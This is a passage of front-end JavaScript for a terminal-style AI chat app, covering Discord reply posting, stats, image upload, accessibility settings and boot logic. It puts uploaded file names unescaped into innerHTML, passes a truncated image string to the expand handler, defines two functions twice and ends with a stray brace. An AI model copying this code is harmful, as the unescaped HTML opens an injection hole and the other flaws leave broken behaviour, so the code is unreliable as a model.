    const user = JSON.parse(localStorage.getItem('nexus_user_data') || '{"name":"Guest"}');
    
    const embed = {
        title: `🤖 Nexus Reply to ${user.name}`,
        color: 0xff00ff,
        description: `\`\`\`\n${responseText.slice(0, 1500)}\n\`\`\``,
        timestamp: new Date().toISOString()
    };
    
    postToDiscord({ embeds: [embed] }, discordThreadId || null);
}

function jsonPayload(cmd) {
    const history = (messageHistory || []).slice(-10);
    const payload = { command: cmd, history: history, mode: currentMode, context: XAVIER_BIO };
    if (pendingImageB64) {
        payload.image = pendingImageB64;
        pendingImageB64 = null; // consume — sent once
    }
    return JSON.stringify(payload);
}

let statsWs;
function connectStats() {
    if (statsWs) { statsWs.onclose = null; statsWs.close(); }
    statsWs = new WebSocket(STATS_URL);
    statsWs.onmessage = (e) => {
        try {
            const d = JSON.parse(e.data);
            if (cpuStat) cpuStat.textContent = d.cpu.toFixed(1) + '%';
            if (memStat) memStat.textContent = d.mem.toFixed(1) + '%';
        } catch (_) {}
    };
    statsWs.onclose = () => setTimeout(connectStats, 5000);
}

function updateClientStats() {
    if (statsWs && statsWs.readyState === WebSocket.OPEN) return;
    if (!cpuStat) cpuStat = document.getElementById('cpu-stat');
    if (!memStat) memStat = document.getElementById('mem-stat');
    if (cpuStat) cpuStat.textContent = (navigator.hardwareConcurrency || '--') + ' Cores';
    if (memStat) memStat.textContent  = (navigator.deviceMemory || '--') + ' GB';
}

// =============================================================
//  IMAGE VIEWER + AI SCAN
// =============================================================
let pendingImageB64 = null; // set when an image is loaded, cleared after sending

function openImageViewer(file) {
    if (!file || !file.type.startsWith('image/')) return;

    const reader = new FileReader();
    reader.onload = (ev) => {
        pendingImageB64 = ev.target.result;
        const b64 = pendingImageB64;

        // ── Inline terminal thumbnail ──────────────────────────
        const p = document.createElement('p');
        p.className = 'sys-msg';
        p.innerHTML = `📎 <b style="color:#0ff">${file.name}</b> <span style="color:#444">(${(file.size/1024).toFixed(1)} KB)</span><br>
            <img src="${b64}"
                 style="max-height:72px;max-width:180px;border:1px solid #0ff;border-radius:3px;margin-top:5px;display:block;cursor:pointer;"
                 title="Click to expand"
                 onclick="nexusExpandImg('${b64.slice(0,32)}')">
            <span style="font-size:0.7rem;color:#555;">Ask a question or type <b style="color:#0ff;">scan image</b> to analyze</span>`;
        output.appendChild(p);
        output.scrollTop = output.scrollHeight;

        // No GUI popup — stays in chat. Click thumbnail to expand.
        input.focus();
    };
    reader.readAsDataURL(file);
}

// Expand image full-size in GUI when thumbnail clicked
window.nexusExpandImg = function(src) {
    stopAllGames();
    guiTitle.textContent = 'IMAGE VIEWER';
    guiContent.innerHTML = `<div style="text-align:center;"><img src="${src}" style="max-width:100%;border:2px solid #0ff;border-radius:4px;display:block;margin:0 auto;"></div>`;
    nexusCanvas.style.display = 'none';
    guiContainer.classList.remove('gui-hidden');
};

document.getElementById('img-input').addEventListener('change', (e) => {
    if (e.target.files[0]) openImageViewer(e.target.files[0]);
    e.target.value = '';
});

// =============================================================
//  MOBILE: hide sidebar when keyboard is open
// =============================================================
const quickActions = document.querySelector('.quick-actions');
input.addEventListener('focus', () => {
    if (window.innerWidth <= 700) quickActions.classList.add('kb-hidden');
});
input.addEventListener('blur', () => {
    quickActions.classList.remove('kb-hidden');
});

// =============================================================
//  INIT
// =============================================================
// Restore saved mode (UI only — no message, no flash)
if (currentMode !== 'nexus') {
    const m = MODES[currentMode];
    if (m) {
        const promptEl  = document.getElementById('prompt-label');
        const titleEl   = document.getElementById('status-title');
        const modeIndEl = document.getElementById('mode-indicator');
        if (promptEl)  promptEl.textContent  = m.prompt;
        if (titleEl)   titleEl.textContent   = m.title;
        if (modeIndEl) modeIndEl.textContent = m.label;
        if (m.color) {
            document.documentElement.style.setProperty('--accent', m.color);
            document.documentElement.style.setProperty('--txt-color', m.color);
        }
        document.querySelectorAll('.mode-btn').forEach(b => {
            b.classList.toggle('active', b.dataset.mode === currentMode);
        });
    }
}
// Restore current mode's history into memory
const _savedHistory = loadHistory(currentMode);
if (_savedHistory.length) {
    messageHistory = _savedHistory;
    setTimeout(() => {
        const col = MODE_COLORS[currentMode] || '#0ff';
        printToTerminal(`[SYS] ${_savedHistory.length} ${currentMode.toUpperCase()} messages from last session — type <b style="color:${col}">history</b> to view all modes.`, 'sys-msg');
    }, 2000);
}

connectWS();
connectStats();
updateClientStats();
setInterval(updateClientStats, 5000);

// =============================================================
//  ACCESSIBILITY
// =============================================================

const A11Y_CLASSES = ['a11y-large', 'a11y-xl', 'a11y-high-contrast', 'a11y-reduce-motion', 'a11y-dyslexic', 'a11y-wide-spacing', 'a11y-bold', 'a11y-dim', 'crt-mode'];

function _a11ySave() {
    const active = A11Y_CLASSES.filter(c => document.body.classList.contains(c));
    localStorage.setItem('nexus_a11y', JSON.stringify(active));
    localStorage.setItem('nexus_sound', SoundManager.enabled ? '1' : '0');
}

function toggleSound() {
    SoundManager.enabled = !SoundManager.enabled;
    if (SoundManager.enabled) SoundManager.playBloop(600, 0.05);
    _a11ySave();
    _a11ySyncButtons();
}

function clearAllHistory() {
    if (!confirm("Wipe ALL conversation memory across ALL modes?")) return;
    Object.values(HISTORY_KEYS).forEach(key => localStorage.removeItem(key));
    messageHistory = [];
    printToTerminal("[SYSTEM] Global memory wiped. All modes reset.", "sys-msg");
    const p = document.getElementById('a11y-panel');
    if (p) p.classList.remove('a11y-panel-open');
}

function _a11ySyncButtons() {
    document.querySelectorAll('.a11y-toggle').forEach(btn => {
        const cls = btn.dataset.class;
        if (cls) btn.classList.toggle('on', document.body.classList.contains(cls));
        if (btn.id === 'sound-toggle') btn.classList.toggle('on', SoundManager.enabled);
    });
}

function toggleA11yClass(cls) {
    document.body.classList.toggle(cls);
    if (cls === 'a11y-large' && document.body.classList.contains(cls))  document.body.classList.remove('a11y-xl');
    if (cls === 'a11y-xl'    && document.body.classList.contains(cls))  document.body.classList.remove('a11y-large');
    _a11ySave();
    _a11ySyncButtons();
}

function toggleSound() {
    SoundManager.enabled = !SoundManager.enabled;
    if (SoundManager.enabled) SoundManager.playBloop(600, 0.05);
    _a11ySave();
    _a11ySyncButtons();
}

// ── Voice selection helpers ──────────────────────────────────────────────────
// Preferred voice names in priority order (Google > Microsoft > macOS > default)
const _VOICE_PREF = [
    'Google US English', 'Google UK English Female', 'Google UK English Male',
    'Microsoft Aria Online (Natural) - English (United States)',
    'Microsoft Jenny Online (Natural) - English (United States)',
    'Microsoft Guy Online (Natural) - English (United States)',
    'Microsoft Zira - English (United States)',
    'Microsoft David - English (United States)',
    'Samantha', 'Alex', 'Karen', 'Daniel',
];

function _pickBestVoice(voices) {
    // Try ranked preferences first
    for (const name of _VOICE_PREF) {
        const v = voices.find(v => v.name === name);
        if (v) return v;
    }
    // Fall back to any en-US voice, then any English voice
    return voices.find(v => v.lang === 'en-US')
        || voices.find(v => v.lang.startsWith('en'))
        || voices[0];
}

function _buildVoiceOptions(sel) {
    const voices = window.speechSynthesis.getVoices();
    if (!voices.length) {
        sel.innerHTML = '<option value="">No voices available</option>';
        return;
    }
    const saved = localStorage.getItem('nexus_tts_voice');
    const list  = voices.filter(v => v.lang.startsWith('en'));
    sel.innerHTML = '<option value="">— Auto (best available) —</option>';
    (list.length ? list : voices).forEach(v => {
        const opt = document.createElement('option');
        opt.value = v.name;
        opt.textContent = `${v.name} (${v.lang})`;
        sel.appendChild(opt);
    });
    // Set selection using sel.value — simpler and always works
    if (saved) {
        sel.value = saved;
        if (!sel.value) { sel.value = ''; localStorage.removeItem('nexus_tts_voice'); }
    } else {
        const best = _pickBestVoice(list.length ? list : voices);
        if (best) sel.value = best.name;
    }
}

function clearAllHistory() {
    if (!confirm("Wipe ALL conversation memory across ALL modes?")) return;
    Object.values(HISTORY_KEYS).forEach(key => localStorage.removeItem(key));
    messageHistory = [];
    printToTerminal("[SYSTEM] Global memory wiped. All modes reset.", "sys-msg");
    const p = document.getElementById('a11y-panel');
    if (p) p.classList.remove('a11y-panel-open');
}

function toggleA11yPanel() {
    const panel = document.getElementById('a11y-panel');
    if (panel) {
        panel.classList.toggle('a11y-panel-open');
        // Re-populate voices each open (Chrome loads them async after first gesture)
        if (panel.classList.contains('a11y-panel-open')) {
            const sel = panel.querySelector('#a11y-voice-sel');
            if (sel) _buildVoiceOptions(sel);
        }
        return;
    }

    const el = document.createElement('div');
    el.id = 'a11y-panel';
    el.className = 'a11y-panel a11y-panel-open';
    el.innerHTML = `
        <div class="a11y-panel-header">
            <span>[ ACCESSIBILITY ]</span>
            <button onclick="document.getElementById('a11y-panel').classList.remove('a11y-panel-open')" class="a11y-close">✕</button>
        </div>

        <div class="a11y-section-label">VISUALS</div>

        <div class="a11y-row">
            <button class="a11y-toggle" data-class="crt-mode" onclick="toggleA11yClass('crt-mode')">CRT Mode</button>
            <button class="a11y-toggle" id="sound-toggle" onclick="toggleSound()">Sound Effects</button>
        </div>

        <div class="a11y-section-label">TEXT SIZE</div>
        <div class="a11y-row">
            <button class="a11y-toggle" data-class="a11y-large" onclick="toggleA11yClass('a11y-large')">Large</button>
            <button class="a11y-toggle" data-class="a11y-xl"    onclick="toggleA11yClass('a11y-xl')">Extra Large</button>
        </div>

        <div class="a11y-section-label">TEXT STYLE</div>
        <div class="a11y-row">
            <button class="a11y-toggle" data-class="a11y-bold"         onclick="toggleA11yClass('a11y-bold')">Bold</button>
            <button class="a11y-toggle" data-class="a11y-wide-spacing" onclick="toggleA11yClass('a11y-wide-spacing')">Wide Spacing</button>
        </div>
        <div class="a11y-row">
            <button class="a11y-toggle" data-class="a11y-dyslexic" onclick="toggleA11yClass('a11y-dyslexic')">Dyslexia Font</button>
        </div>

        <div class="a11y-section-label">DISPLAY</div>
        <div class="a11y-row">
            <button class="a11y-toggle" data-class="a11y-high-contrast" onclick="toggleA11yClass('a11y-high-contrast')">High Contrast</button>
            <button class="a11y-toggle" data-class="a11y-dim"           onclick="toggleA11yClass('a11y-dim')">Dim Mode</button>
        </div>
        <div class="a11y-row">
            <button class="a11y-toggle" data-class="a11y-reduce-motion" onclick="toggleA11yClass('a11y-reduce-motion')">Less Motion</button>
        </div>

        <div class="a11y-section-label">VOICE (speak command)</div>
        <select id="a11y-voice-sel" class="a11y-voice-sel">
            <option value="">Loading voices…</option>
        </select>

        <div class="a11y-tip">All settings saved automatically.</div>
    `;
    document.querySelector('.glass-panel').appendChild(el);
    _a11ySyncButtons();

    // Populate voice picker — voices load async in Chrome
    const sel = el.querySelector('#a11y-voice-sel');
    const doPopulate = () => _buildVoiceOptions(sel);
    if (window.speechSynthesis.getVoices().length) {
        doPopulate();
    } else {
        window.speechSynthesis.addEventListener('voiceschanged', doPopulate, { once: true });
    }

    sel.addEventListener('change', () => {
        if (sel.value) localStorage.setItem('nexus_tts_voice', sel.value);
        else           localStorage.removeItem('nexus_tts_voice');
    });
}

// =============================================================
//  RESTORE & BOOT
// =============================================================

// Global Boot
window.onload = async () => {
    try {
        // Initialize DOM references
        cpuStat      = document.getElementById('cpu-stat');
        memStat      = document.getElementById('mem-stat');
        output       = document.getElementById('terminal-output');
        input        = document.getElementById('terminal-input');
        guiContainer = document.getElementById('game-gui-container');
        guiContent   = document.getElementById('gui-content');
        guiTitle     = document.getElementById('gui-title');
        nexusCanvas  = document.getElementById('nexus-canvas');

        // Load history for the current mode on boot
        messageHistory = loadHistory(currentMode);

        // Start auth in background (non-blocking)
        initGoogleAuth();

        const nexusUser = JSON.parse(localStorage.getItem('nexus_user_data') || 'null');
        if (nexusUser && nexusUser.name) {
            revealTerminal(nexusUser.name);
        } else {
            console.log("[NEXUS] Awaiting Authorization...");
        }
    } catch (e) {
        console.error("[CRITICAL] Boot sequence failed:", e);
        // Ensure diagnostic reporter catches this if it's a hard crash
        throw e; 
    }
};}